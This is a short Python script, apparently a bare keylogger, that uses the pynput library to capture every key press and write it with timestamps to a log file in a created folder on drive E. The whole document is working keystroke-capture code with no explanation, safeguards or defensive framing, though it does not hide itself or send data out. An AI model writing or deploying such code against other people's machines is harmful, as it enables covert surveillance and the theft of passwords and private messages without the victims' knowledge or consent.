import pynput
import os
from pynput.keyboard import Key, Listener
import logging

try:
   os.mkdir("E:\\keyy")
except:
   pass
log_dir = "E:\\keyy\\"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(Key):
   logging.info(str(Key))

with Listener(on_press=on_press) as listener:
    listener.join()
print()
